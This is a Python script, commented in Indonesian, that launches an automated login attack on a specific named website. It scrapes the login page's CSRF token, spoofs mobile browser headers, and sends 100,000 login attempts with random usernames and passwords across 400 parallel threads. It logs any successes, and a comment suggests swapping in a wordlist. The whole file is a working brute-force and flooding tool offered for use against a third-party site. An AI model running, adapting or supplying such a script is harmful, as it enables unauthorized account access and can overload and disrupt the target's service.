import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from urllib.parse import urljoin

# Konfigurasi target
BASE_URL = "https://migoreng.my.id"
LOGIN_URL = urljoin(BASE_URL, "/auth/user/login")
JUMLAH_THREAD = 400
MAKSIMAL_REQUEST = 100000
LOG_FILE = "login.txt"

# Lock untuk penulisan aman di multi-thread
file_lock = Lock()

def get_login_page(session):
    """Mengambil halaman login untuk mendapatkan _token (CSRF)"""
    try:
        resp = session.get(LOGIN_URL, timeout=5)
        if resp.status_code == 200:
            # Cari _token di HTML (asumsi format: value="TOKEN" di input hidden)
            start_marker = 'name="_token" value="'
            start_idx = resp.text.find(start_marker)
            if start_idx != -1:
                start_idx += len(start_marker)
                end_idx = resp.text.find('"', start_idx)
                if end_idx != -1:
                    return resp.text[start_idx:end_idx]
        return None
    except Exception:
        return None

def log_attempt(nomor_urut, username, password, status, reason=""):
    with file_lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            if status == "success":
                f.write(f"[SUCCESS] #{nomor_urut} | User: {username} | Pass: {password} | Reason: {reason}\n")
            else:
                f.write(f"[FAILED]  #{nomor_urut} | User: {username} | Pass: {password} | Reason: {reason}\n")

def attempt_login(nomor_urut):
    session = requests.Session()
    
    # Opsional: Set user-agent seperti mobile Chrome
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
    })

    # Ambil _token CSRF dari halaman login
    csrf_token = get_login_page(session)
    if not csrf_token:
        reason = "Gagal ambil _token CSRF"
        print(f"[!] #{nomor_urut} ERROR → {reason}")
        log_attempt(nomor_urut, "?", "?", "error", reason)
        return

    # Buat kredensial acak (bisa diganti dengan wordlist)
    username = "".join(random.choices(string.digits, k=8))  # Nomor HP palsu
    password = "".join(random.choices(string.ascii_letters + string.digits, k=8))

    payload = {
        "_token": csrf_token,
        "username": username,
        "password": password,
    }

    try:
        response = session.post(
            LOGIN_URL,
            data=payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=5
        )

        # Deteksi keberhasilan berdasarkan redirect atau konten respons
        if response.status_code == 200 and ("dashboard" in response.url or "home" in response.url or "logout" in response.text.lower()):
            reason = "Login sukses (redirect/detected)"
            print(f"[+] #{nomor_urut} SUKSES! User: {username}")
            log_attempt(nomor_urut, username, password, "success", reason)
        elif response.status_code == 419:
            reason = "Token CSRF tidak valid / kadaluarsa"
            print(f"[-] #{nomor_urut} GAGAL → {reason}")
            log_attempt(nomor_urut, username, password, "failed", reason)
        elif response.status_code == 403 and "cloudflare" in response.text.lower():
            reason = "Diblokir Cloudflare (JS challenge / cf_clearance diperlukan)"
            print(f"[-] #{nomor_urut} GAGAL → {reason}")
            log_attempt(nomor_urut, username, password, "failed", reason)
        else:
            # Coba parse pesan error dari HTML jika ada
            if "kredensial salah" in response.text.lower() or "invalid" in response.text.lower():
                reason = "Kredensial salah"
            else:
                reason = f"HTTP {response.status_code}"
            print(f"[-] #{nomor_urut} GAGAL | User: {username} → {reason}")
            log_attempt(nomor_urut, username, password, "failed", reason)

    except Exception as e:
        error_msg = f"{type(e).__name__}: {e}"
        print(f"[!] #{nomor_urut} ERROR → {error_msg}")
        log_attempt(nomor_urut, username, password, "error", error_msg)

def main():
    open(LOG_FILE, "w").close()  # Reset log file
    print(f"[+] Memulai simulasi login: {MAKSIMAL_REQUEST} percobaan, {JUMLAH_THREAD} thread")
    print(f"[+] Log disimpan ke: {LOG_FILE}\n")

    with ThreadPoolExecutor(max_workers=JUMLAH_THREAD) as executor:
        list(executor.map(attempt_login, range(1, MAKSIMAL_REQUEST + 1)))

    print(f"\n[✓] Selesai. Hasil di '{LOG_FILE}'.")

if __name__ == "__main__":
    main()
